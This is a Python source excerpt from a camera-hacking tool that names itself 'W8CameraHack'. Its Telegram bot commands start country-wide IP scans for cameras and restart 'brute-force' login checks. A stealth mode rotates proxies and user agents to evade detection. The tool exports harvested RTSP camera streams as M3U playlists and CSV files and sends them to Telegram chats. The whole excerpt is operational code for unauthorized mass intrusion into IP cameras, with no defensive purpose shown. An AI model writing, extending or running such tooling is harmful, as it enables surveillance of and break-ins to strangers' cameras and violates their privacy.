                elif cmd in ("/setthreshold", f"/setthreshold@{bot_token.split(':')[0]}"):
                    global _cli_error_threshold
                    _st_parts = text.split()
                    if len(_st_parts) >= 2:
                        try:
                            _new_thr = float(_st_parts[1])
                            _new_thr = max(0.05, min(_new_thr, 1.0))
                            _cli_error_threshold = _new_thr
                            _telegram_cmd_reply(
                                reply_token, from_chat,
                                f"📊 <b>Error-rate threshold set to {_new_thr*100:.0f}%</b>\n"
                                "━━━━━━━━━━━━━━━━━━━━━━\n"
                                "Cooldown + thread halving fires above this rate.\n"
                                f"Valid range: 5% – 100%"
                            )
                        except ValueError:
                            _telegram_cmd_reply(
                                reply_token, from_chat,
                                "⚠️ Invalid value. Send a number between 0.05 and 1.0\n"
                                "Example: /setthreshold 0.4"
                            )
                    else:
                        _telegram_cmd_reply(
                            reply_token, from_chat,
                            f"📊 <b>Error threshold: {_cli_error_threshold*100:.0f}%</b>\n"
                            "━━━━━━━━━━━━━━━━━━━━━━\n"
                            "Usage: /setthreshold 0.4\n"
                            "Range: 0.05 (5%) → 1.0 (100%)\n"
                            "Cooldown fires when rolling error rate exceeds this."
                        )

                elif cmd in ("/stealth", f"/stealth@{bot_token.split(':')[0]}"):
                    global _stealth_mode
                    _stealth_mode = not _stealth_mode
                    _sm_label = 'ON 🥷' if _stealth_mode else 'OFF'
                    _telegram_cmd_reply(
                        reply_token, from_chat,
                        f"🥷 <b>Stealth Mode {_sm_label}</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━━━\n"
                        + (f"Random delays {_STEALTH_MIN:.2f}s–{_STEALTH_MAX:.2f}s active.\n"
                           "UA rotation and proxy rotation engaged."
                           if _stealth_mode else
                           "Normal scan speed resumed.")
                    )

                elif cmd in ("/heatmap", f"/heatmap@{bot_token.split(':')[0]}"):
                    _hm_lines = []
                    _hm_counts: dict = {}
                    try:
                        for _hf in find_valid_camera_files():
                            _hcc = extract_country_code_from_filename(os.path.basename(_hf))
                            if _hcc and _hcc not in ('Valid', 'XX'):
                                with open(_hf, 'r', encoding='utf-8', errors='replace') as _hff:
                                    _n = sum(1 for _l in _hff if _l.startswith('IP:'))
                                _hm_counts[_hcc] = _hm_counts.get(_hcc, 0) + _n
                    except Exception:
                        pass
                    if _hm_counts:
                        _hm_top = sorted(_hm_counts.items(), key=lambda x: x[1], reverse=True)[:15]
                        _hm_max = max(v for _, v in _hm_top) or 1
                        _hm_msg = "📊 <b>Camera Density Heatmap</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
                        for _hcc2, _hn in _hm_top:
                            _flag2 = country_flag(_hcc2)
                            _bar   = '█' * int(_hn / _hm_max * 12)
                            _hm_msg += f"{_flag2} <b>{_hcc2}</b> {_bar} {_hn}\n"
                        _telegram_cmd_reply(reply_token, from_chat, _hm_msg)
                    else:
                        _telegram_cmd_reply(reply_token, from_chat,
                                            "📊 No camera data available for heatmap yet.")

                elif cmd in ("/offenders", f"/offenders@{bot_token.split(':')[0]}"):
                    _off_data = load_repeat_offenders()
                    if _off_data:
                        _off_top = sorted(_off_data.items(), key=lambda x: x[1]['count'], reverse=True)[:10]
                        _off_msg = f"♻️ <b>Top Repeat Offenders ({len(_off_data)} total)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
                        for _oip, _orec in _off_top:
                            _oflag = country_flag(_orec.get('country', ''))
                            _off_msg += (f"{_oflag} <code>{_oip}</code> — seen <b>{_orec['count']}x</b>\n"
                                         f"  {_orec.get('camera_type','?')[:30]}\n"
                                         f"  Last: {_orec['last_seen'][:16]}\n")
                        _telegram_cmd_reply(reply_token, from_chat, _off_msg)
                    else:
                        _telegram_cmd_reply(reply_token, from_chat,
                                            "♻️ No repeat offenders recorded yet.")

                elif cmd in ("/m3u", f"/m3u@{bot_token.split(':')[0]}"):
                    _telegram_cmd_reply(reply_token, from_chat,
                                        "🎬 Generating M3U playlist from all ValidCamera files...")
                    try:
                        _m3u_path = generate_m3u_from_all_results()
                        if _m3u_path and os.path.exists(_m3u_path):
                            send_telegram_file_blocking(_m3u_path, "🎬 All-Cameras M3U Playlist")
                        else:
                            _telegram_cmd_reply(reply_token, from_chat, "❌ No RTSP URLs found to export.")
                    except Exception as _m3u_e:
                        _telegram_cmd_reply(reply_token, from_chat, f"❌ M3U error: {_m3u_e}")

                elif cmd in ("/csv", f"/csv@{bot_token.split(':')[0]}"):
                    _telegram_cmd_reply(reply_token, from_chat,
                                        "📊 Exporting results to CSV...")
                    try:
                        _csv_path = export_to_csv(file_path=None)
                        if _csv_path and os.path.exists(_csv_path):
                            send_telegram_file_blocking(_csv_path, "📊 W8 Results CSV")
                        else:
                            _telegram_cmd_reply(reply_token, from_chat, "❌ No data to export.")
                    except Exception as _csv_e:
                        _telegram_cmd_reply(reply_token, from_chat, f"❌ CSV error: {_csv_e}")

                elif text.lower().startswith("/cve "):
                    _cve_type = text[5:].strip()
                    _cve_res  = check_cve(_cve_type)
                    if _cve_res:
                        _cve_msg = f"🔓 <b>CVEs for '{_cve_type}'</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
                        for _cid, _cdesc, _csev in _cve_res:
                            _ce = '🚨' if _csev == 'CRITICAL' else '🔴' if _csev == 'HIGH' else '🟡'
                            _cve_msg += f"{_ce} <code>{_cid}</code>\n{_cdesc}\n\n"
                        _telegram_cmd_reply(reply_token, from_chat, _cve_msg)
                    else:
                        _telegram_cmd_reply(reply_token, from_chat,
                                            f"✅ No known CVEs found for: <code>{_cve_type}</code>")

                elif cmd in ("/restart", f"/restart@{bot_token.split(':')[0]}"):
                    _sp = load_scan_progress()
                    _bp = load_brute_progress()

                    if not _sp and not _bp:
                        _telegram_cmd_reply(
                            reply_token, from_chat,
                            "⚠️ <b>Nothing to restart.</b>\n"
                            "━━━━━━━━━━━━━━━━━━━━━━\n"
                            "No saved scan progress found.\n"
                            "Start a scan from the terminal first,\n"
                            "then use /stop to save its position."
                        )
                    else:
                        # ── Reset all control flags ────────────────────────
                        _stop_requested.clear()
                        _scan_paused.clear()
                        with _remote_thread_override_lock:
                            _remote_thread_override = 0

                        # ── Decide what to restart (IP scan takes priority) ─
                        _restart_target = 'scan' if _sp else 'brute'

                        if _restart_target == 'scan':
                            _rc    = _sp.get('country_code', '')
                            _rn    = _sp.get('country_name', '?')
                            _done  = _sp.get('scanned_count', 0)
                            _total = _sp.get('total_ips', 0)
                            _pct   = int(_done * 100 / _total) if _total else 0
                            _resume_country = next(
                                (c for c in COUNTRIES.values()
                                 if c.get('code') == _rc), None
                            )
                            if _resume_country:
                                def _run_scan(_c=_resume_country):
                                    try:
                                        scan_country_cameras_detection_only(_c)
                                    except Exception as _e:
                                        _log_tg_err(f"[/restart] IP scan error: {_e}")
                                threading.Thread(
                                    target=_run_scan, daemon=True,
                                    name="RestartedIPScan"
                                ).start()
                                _also = ""
                                if _bp:
                                    _bf = os.path.basename(_bp.get('input_file', '?'))
                                    _also = (f"\n📌 Login-check progress for <code>{_bf}</code> "
                                             f"is also saved — send /restart again after this scan.")
                                _telegram_cmd_reply(
                                    reply_token, from_chat,
                                    f"🔄 <b>IP Scan Restarted</b>\n"
                                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                                    f"🌍 Country: <b>{_rn} ({_rc})</b>\n"
                                    f"📍 Resuming: {_done:,}/{_total:,} IPs ({_pct}%)\n"
                                    f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                                    + _also
                                )
                            else:
                                _telegram_cmd_reply(
                                    reply_token, from_chat,
                                    f"❌ Country code <b>{_rc}</b> not found in database.\n"
                                    f"Clearing stale progress — start a fresh scan from the terminal."
                                )
                                clear_scan_progress()

                        else:  # brute-force restart
                            _bf_path  = _bp.get('input_file', '')
                            _bf_file  = os.path.basename(_bf_path)
                            _bf_done  = _bp.get('last_camera_index', 0)
                            _bf_total = _bp.get('total_cameras', 0)
                            _bf_pct   = int(_bf_done * 100 / _bf_total) if _bf_total else 0
                            if _bf_path and os.path.exists(_bf_path):
                                def _run_brute(_fp=_bf_path):
                                    try:
                                        brute_force_from_file(_fp)
                                    except Exception as _e:
                                        _log_tg_err(f"[/restart] login-check error: {_e}")
                                threading.Thread(
                                    target=_run_brute, daemon=True,
                                    name="RestartedLoginCheck"
                                ).start()
                                _telegram_cmd_reply(
                                    reply_token, from_chat,
                                    f"🔄 <b>Login Check Restarted</b>\n"
                                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                                    f"📂 File: <code>{_bf_file}</code>\n"
                                    f"📍 Resuming: {_bf_done:,}/{_bf_total:,} cameras ({_bf_pct}%)\n"
                                    f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                                )
                            else:
                                _telegram_cmd_reply(
                                    reply_token, from_chat,
                                    f"❌ Source file not found: <code>{_bf_file}</code>\n"
                                    f"Cannot restart — original camera list is missing."
                                )
                                clear_brute_progress()

                elif cmd in ("/scan", f"/scan@{bot_token.split(':')[0]}"):
                    _parts = text.split()
                    if len(_parts) < 2:
                        _telegram_cmd_reply(
                            reply_token, from_chat,
                            "⚠️ <b>Usage:</b> /scan &lt;country code&gt;\n"
                            "━━━━━━━━━━━━━━━━━━━━━━\n"
                            "Examples:\n"
                            "  <code>/scan US</code>  — United States\n"
                            "  <code>/scan TR</code>  — Turkey\n"
                            "  <code>/scan KR</code>  — South Korea\n"
                            "Send /list to see results once the scan finishes."
                        )
                    else:
                        _cc = _parts[1].upper().strip()
                        _found_country = next(
                            (c for c in COUNTRIES.values()
                             if c.get('code') == _cc), None
                        )
                        if not _found_country:
                            _telegram_cmd_reply(
                                reply_token, from_chat,
                                f"❌ Unknown country code: <b>{_cc}</b>\n"
                                "Use a valid ISO 3166-1 alpha-2 code.\n"
                                "Examples: US, TR, CN, DE, BR, JP, IN, RU"
                            )
                        else:
                            # Reset all control flags for a clean start
                            _stop_requested.clear()
                            _scan_paused.clear()
                            with _remote_thread_override_lock:
                                _remote_thread_override = 0

                            def _run_new_scan(_c=_found_country):
                                try:
                                    scan_country_cameras_detection_only(_c)
                                except Exception as _e:
                                    _log_tg_err(f"[/scan] error: {_e}")

                            threading.Thread(
                                target=_run_new_scan, daemon=True,
                                name=f"BotScan_{_cc}"
                            ).start()
                            _telegram_cmd_reply(
                                reply_token, from_chat,
                                f"🚀 <b>Scan Started</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                                f"🌍 Country: <b>{_found_country['name']} ({_cc})</b>\n"
                                f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                                f"📡 IP ranges will be fetched automatically.\n"
                                f"Use /status to monitor progress."
                            )

                elif cmd in ("/scanlist", f"/scanlist@{bot_token.split(':')[0]}"):
                    _rir_labels = {
                        'apnic':   '🌏 <b>APNIC — Asia-Pacific</b>',
                        'ripe':    '🌍 <b>RIPE — Europe / Middle East / Central Asia</b>',
                        'arin':    '🌎 <b>ARIN — North America / Caribbean</b>',
                        'lacnic':  '🌎 <b>LACNIC — Latin America</b>',
                        'afrinic': '🌍 <b>AFRINIC — Africa</b>',
                    }
                    _rir_order = ['apnic', 'ripe', 'arin', 'lacnic', 'afrinic']
                    _sent = 0
                    for _rir in _rir_order:
                        _entries = sorted(
                            (c for c in COUNTRIES.values() if c.get('rir') == _rir),
                            key=lambda c: c['name']
                        )
                        if not _entries:
                            continue
                        _msg = _rir_labels.get(_rir, f'<b>{_rir.upper()}</b>') + "\n"
                        _msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
                        for _c in _entries:
                            _msg += f"<code>{_c['code']}</code> — {_c['name']}\n"
                        _msg += f"\n<i>Use /scan {_entries[0]['code']} to start scanning</i>"
                        _telegram_cmd_reply(reply_token, from_chat, _msg)
                        _sent += 1
                    if _sent == 0:
                        _telegram_cmd_reply(reply_token, from_chat,
                                            "⚠️ Country list is empty.")

                elif cmd in ("/help", "/start",
                             f"/help@{bot_token.split(':')[0]}"):
                    help_text = (
                        "🤖 <b>W8CameraHack Bot Commands</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━━━\n"
                        "/status          — Live scan progress\n"
                        "                   mode · country · % · speed · ETA\n"
                        "/scan &lt;CC&gt;       — Start scan for country code\n"
                        "/scanlist        — All 255 country codes by region\n"
                        "/pause           — Pause the running scan\n"
                        "/resume          — Resume a paused scan\n"
                        "/stop            — Graceful stop (saves progress)\n"
                        "/restart         — Resume saved scan without terminal\n"
                        "/threads &lt;n&gt;     — Set thread count (0 = adaptive)\n"
                        "/setthreshold &lt;n&gt; — Set error-rate cooldown threshold (0.05-1.0)\n"
                        "/list            — List all result files on disk\n"
                        "/get &lt;filename&gt;  — Download a result file\n"
                        "/help            — This help message\n"
                    )
                    _telegram_cmd_reply(reply_token, from_chat, help_text)

        except Exception:
            time.sleep(5)


def start_telegram_cmd_handler() -> None:
    """Start the Telegram command-polling thread (idempotent — safe to call many times)."""
    global _telegram_cmd_thread
    if not TELEGRAM_CONFIG.get("enabled"):
        return
    with _telegram_cmd_thread_lock:
        if _telegram_cmd_thread is None or not _telegram_cmd_thread.is_alive():
            _telegram_cmd_thread = threading.Thread(
                target=_telegram_cmd_worker, daemon=True, name="TgCmdHandler"
            )
            _telegram_cmd_thread.start()


def send_telegram_file_blocking(file_path: str, caption: str = "", retries: int = 3):
    """Blocking file send with exponential-backoff retry — sends to ALL enabled destinations."""
    if not TELEGRAM_CONFIG.get("enabled"):
        return False
    destinations = TELEGRAM_CONFIG.get("destinations", [])
    if not destinations:
        return False
    if not os.path.exists(file_path):
        err = f"⚠️ <b>File Send Failed</b>\nFile not found: <code>{os.path.basename(file_path)}</code>\nCaption: {caption}"
        send_telegram_message(err)
        print(f"[!] Telegram file send failed: {file_path} does not exist")
        return False

    file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
    any_success = False
    session = _get_telegram_session()

    for dest in destinations:
        if not dest.get("enabled", True):
            continue
        bot_token = dest.get("bot_token", "")
        chat_id = dest.get("chat_id", "")
        dest_name = dest.get("name", "Unknown")
        if not bot_token or not chat_id:
            continue

        send_url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        print(f"[*] Sending file to [{dest_name}]: {os.path.basename(file_path)} ({file_size_mb:.2f}MB)")

        def _send(u=send_url, fp=file_path, cid=chat_id, cap=caption):
            with open(fp, 'rb') as fh:
                return session.post(u, files={"document": fh},
                                    data={"chat_id": cid, "caption": cap[:1024]},
                                    timeout=(25, 200))

        success, resp = _telegram_send_with_retry(_send, dest_name, max_retries=max(retries, 5),
                                                   delays=[5, 12, 25, 45, 60])
        if success and resp is not None:
            if resp.status_code == 200 and resp.json().get("ok"):
                print(f"[✓] File sent to [{dest_name}]: {os.path.basename(file_path)}")
                any_success = True
            else:
                last_error = f"HTTP {resp.status_code}: {resp.text[:200]}"
                print(f"[!] [{dest_name}] rejected file: {last_error}")

    return any_success

def _bg_progress_saver(country_code, country_name, total, output_file, interval=30):
    """Background thread: writes scan_progress.json every `interval` seconds.
    Reads globals directly — never blocked by or dependent on the scan loop."""
    while not _bg_saver_stop.wait(timeout=interval):
        try:
            save_scan_progress(
                country_code=country_code,
                country_name=country_name,
                scanned=scanned_count,
                total=total,
                last_ip_index=_current_range_idx,
                last_ip_in_range=_last_scanned_ip_global,
                output_file=output_file,
                stop_reason=''
            )
        except Exception:
            pass

def save_scan_progress(country_code="", country_name="", scanned=0, total=0,
                       last_ip_index=0, output_file="",
                       last_ip_in_range="", ip_file_checksum="",
                       stop_reason=""):
    """Save scan progress to file for resume capability (thread-safe, atomic write with backup).
    ip_file_checksum: MD5 of the country IP range file so a re-download can be detected.
    last_ip_in_range: last individual IP processed within the current CIDR range.
    stop_reason: 'user_stopped', 'completed', or '' (crash/interrupted)."""
    progress_file = os.path.join(SCRIPT_DIR, "scan_progress.json")
    backup_file = os.path.join(SCRIPT_DIR, "scan_progress.json.bak")
    temp_file = os.path.join(SCRIPT_DIR, "scan_progress.json.tmp")
    try:
        with results_lock:
            # Check if we have valid data before writing
            if not country_code or total <= 0:
                # If data is invalid, don't overwrite with blank/zero
                # This prevents the "blanking" issue during crashes
                return

            progress = {
                "country_code": country_code,
                "country_name": country_name,
                "scanned_count": scanned,
                "total_ips": total,
                "last_ip_index": last_ip_index,
                "last_ip_in_range": last_ip_in_range,
                "ip_file_checksum": ip_file_checksum,
                "stop_reason": stop_reason,
                "cctv_output_file": output_file,
                "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            # Atomic write pattern
            try:
                with open(temp_file, 'w', encoding='utf-8') as f:
                    json.dump(progress, f, indent=2)
                    f.flush()
                    os.fsync(f.fileno())
                
                # Verify the temp file is not empty and is valid JSON
                with open(temp_file, 'r', encoding='utf-8') as f:
                    test_load = json.load(f)
                    if not test_load or "country_code" not in test_load:
                        raise ValueError("Temp file validation failed")

                # Keep a backup before overwriting main file
                if os.path.exists(progress_file):
                    if os.path.exists(backup_file):
                        os.remove(backup_file)
                    os.rename(progress_file, backup_file)
                
                os.rename(temp_file, progress_file)
                # Ensure the file is actually on disk
                pass  # Progress saved silently to avoid breaking the progress bar
            except Exception as write_error:
                print(f"{Fore.RED}[!] Write error during save: {write_error}{Style.RESET_ALL}")
                if os.path.exists(temp_file):
                    os.remove(temp_file)
    except Exception as e:
        try:
            print(f"{Fore.RED}[!] Error saving progress: {e}{Style.RESET_ALL}")
        except Exception:
            pass

def load_scan_progress():
    """Load scan progress from file, with fallback to backup"""
    progress_file = os.path.join(SCRIPT_DIR, "scan_progress.json")
    backup_file = os.path.join(SCRIPT_DIR, "scan_progress.json.bak")
    
    for pf in [progress_file, backup_file]:
        try:
            if os.path.exists(pf):
                with open(pf, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    if data and "country_code" in data:
                        return data
        except Exception:
            continue
    return None

def clear_scan_progress():
    """Delete scan progress and backup files - ONLY on clean completion"""
    # We no longer auto-delete progress on crash signals
    progress_file = os.path.join(SCRIPT_DIR, "scan_progress.json")
    backup_file = os.path.join(SCRIPT_DIR, "scan_progress.json.bak")
    # Only delete if specifically called at the end of a successful scan
    for pf in [progress_file, backup_file]:
        try:
            if os.path.exists(pf):
                os.remove(pf)
        except Exception:
            pass

